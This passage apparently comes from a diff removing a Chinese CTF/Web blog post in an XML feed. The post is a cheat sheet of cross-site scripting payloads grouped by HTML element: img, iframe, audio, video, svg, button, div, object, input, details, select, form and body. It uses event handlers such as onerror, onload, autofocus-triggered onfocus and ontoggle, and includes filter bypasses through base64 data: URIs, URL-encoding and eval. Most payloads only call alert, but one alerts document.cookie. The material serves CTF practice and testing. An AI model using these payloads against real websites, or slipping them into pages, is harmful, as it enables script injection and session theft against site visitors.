-<h3 id="-2"><a href="#-2" class="headerlink" title="&lt;img&gt;"></a>&lt;<code>img&gt;</code></h3><p>作为一个图片触发，成功触发会显示一个破损的图片</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=&quot;alert(<span class="number">1</span>)&quot;&gt;
-&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=eval(&quot;alert(<span class="number">1</span>)&quot;)&gt;
-&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre>
-
-<h3 id="-3"><a href="#-3" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><p>内嵌框架元素</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/iframe&gt;</span>
-<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(document.cookie)<span class="string">&quot;&gt;&lt;/iframe&gt;</span>
-<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
-&lt;<span class="selector-tag">iframe</span> onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
-&lt;<span class="selector-tag">iframe</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
-&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>
-
-<h3 id="-4"><a href="#-4" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><p>音频元素</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">audio</span> <span class="attribute">src</span>=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;
-&lt;<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
-&lt;<span class="selector-tag">audio</span> controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
-&lt;<span class="selector-tag">audio</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;</code></pre>
-
-<h3 id="video"><a href="#video" class="headerlink" title="video"></a><code>video</code></h3><p>视频元素</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">video</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=alert(<span class="number">1</span>)&gt;
-&lt;<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">source</span> onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
-&lt;<span class="selector-tag">video</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
-&lt;<span class="selector-tag">video</span> controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
-&lt;<span class="selector-tag">video</span> controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;</code></pre>
-
-<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a><code>svg</code></h3><p>矢量图片元素</p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">svg</span> onload=javascript:<span class="built_in">alert</span>(<span class="number">1</span>)&gt;
-&lt;svg onload=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/svg&gt;</code></pre>
-
-<h3 id="-5"><a href="#-5" class="headerlink" title="&lt;button&gt;"></a><code>&lt;button&gt;</code></h3><p>元素上点击鼠标时触发（<del>因为人叫button</del></p>
-<p>元素内部构造:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">button</span> onclick=alert(<span class="number">1</span>)&gt;
-&lt;<span class="selector-tag">button</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
-&lt;<span class="selector-tag">button</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
-&lt;<span class="selector-tag">button</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
-&lt;<span class="selector-tag">button</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
-&lt;<span class="selector-tag">button</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
-&lt;<span class="selector-tag">button</span> onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">button</span>&gt;</code></pre>
-
-<h3 id="-6"><a href="#-6" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>html当中常规的切割元素，但是需要urlcode来进行绕过</p>
-<pre><code class="highlight css">原代码：
-&lt;<span class="selector-tag">div</span> onmouseover=&#x27;alert(<span class="number">1</span>)&#x27;&gt;<span class="selector-tag">DIV</span>&lt;/<span class="selector-tag">div</span>&gt;
-经过url编码：
-&lt;<span class="selector-tag">div</span> onmouseover%<span class="number">3</span>d&#x27;alert%<span class="number">26</span>lpar%<span class="number">3</span>b1%<span class="number">26</span>rpar%<span class="number">3</span>b&#x27;&gt;<span class="selector-tag">DIV</span>&lt;%<span class="number">2</span>fdiv&gt;</code></pre>
-
-<h3 id="-7"><a href="#-7" class="headerlink" title="&lt;object&gt;"></a><code>&lt;object&gt;</code></h3><p>嵌入对象元素，引入一个外部资源</p>
-<p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">object</span> data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/<span class="selector-tag">object</span>&gt;</code></pre>
-
-<h3 id="-8"><a href="#-8" class="headerlink" title="&lt;p&gt; "></a><code>&lt;p&gt; </code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">p</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
-&lt;<span class="selector-tag">p</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
-&lt;<span class="selector-tag">p</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
-&lt;<span class="selector-tag">p</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;</code></pre>
-
-<h3 id="-9"><a href="#-9" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">input</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
-&lt;<span class="selector-tag">input</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
-&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
-&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;</code></pre>
-
-<h3 id="-10"><a href="#-10" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details</code>&gt;</h3><pre><code class="highlight css">&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;
-&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;</code></pre>
-
-<h3 id="-11"><a href="#-11" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">select</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/<span class="selector-tag">select</span>&gt;
-&lt;<span class="selector-tag">select</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">select</span>&gt;
-&lt;<span class="selector-tag">select</span> onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/<span class="selector-tag">select</span>&gt;</code></pre>
-
-<h3 id="-12"><a href="#-12" class="headerlink" title="&lt;form&gt;"></a><code>&lt;form&gt;</code></h3><p>表单元素</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
-&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
-&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt;</code></pre>
-
-<h3 id="-13"><a href="#-13" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">body</span> onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">body</span>&gt;</code></pre>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
